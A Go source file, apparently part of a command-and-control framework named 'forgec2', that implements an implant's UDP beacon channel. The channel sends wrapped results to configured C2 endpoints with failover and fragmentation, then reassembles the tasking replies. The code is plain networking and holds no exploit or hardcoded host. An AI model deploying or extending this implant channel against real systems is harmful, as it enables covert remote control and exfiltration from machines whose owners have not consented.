//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"net"
	"strconv"
	"time"

	"github.com/forgec2/forgec2/pkg/protocol"
)

// sendUDPBeacon sends the (already envelope-wrapped) beacon payload as UDP
// datagrams to the C2 endpoint and reads one response. Bodies larger than a
// conservative datagram payload are split into FC2I fragments (the same
// framing ICMP uses) and the reply is reassembled the same way, so a big result
// or task no longer needs a connection-oriented transport.
//
// Every configured udp:// endpoint is tried in failover order. Fragments of
// one beacon all go to the endpoint that answered first only after a complete
// response; a partial/failed exchange leaves the beacon queued for retry.
func sendUDPBeacon(body []byte) []byte {
	return forEachC2Endpoint("udp", func(_ int, _ string, hostPort, _ string) []byte {
		return sendUDPBeaconAt(hostPort, body)
	})
}

func sendUDPBeaconAt(hostPort string, body []byte) []byte {
	addr, err := net.ResolveUDPAddr("udp", hostPort)
	if err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: resolve %s failed: %v\n", hostPort, err)
		}
		return nil
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: dial %s failed: %v\n", addr, err)
		}
		return nil
	}
	defer conn.Close()

	if err := conn.SetDeadline(time.Now().Add(15 * time.Second)); err != nil {
		return nil
	}
	frags := protocol.DatagramFragSplitWithSize(body, udpFragmentPayload(snapshotLink()))
	if len(frags) == 0 {
		if Debug {
			fmt.Println("[!] UDP beacon: body too large for the fragment framing")
		}
		return nil
	}
	for _, frag := range frags {
		if _, err := conn.Write(frag); err != nil {
			if Debug {
				fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
			}
			return nil
		}
	}

	// One connection and a single assembler per exchange: a reply is either a
	// legacy un-fragmented envelope or a set of FC2I parts in any order.
	asm := protocol.NewDatagramAssembler()
	rbuf := make([]byte, 16*1024*1024)
	for {
		n, _, err := conn.ReadFromUDP(rbuf)
		if err != nil {
			if Debug {
				fmt.Printf("[!] UDP beacon: read failed: %v\n", err)
			}
			return nil
		}
		if n == 0 {
			continue
		}
		data := rbuf[:n]
		if protocol.DatagramMaybePlain(data) {
			// The server answers with a raw (optionally malleable-wrapped)
			// envelope; mirror the TCP transport and return it verbatim.
			return data
		}
		msgID, total, index, payload, ok := protocol.DatagramFragParse(data)
		if !ok {
			continue
		}
		full, asmErr := asm.Add(strconv.FormatUint(uint64(msgID), 10), total, index, payload)
		if asmErr != nil || full == nil {
			continue
		}
		return full
	}
}
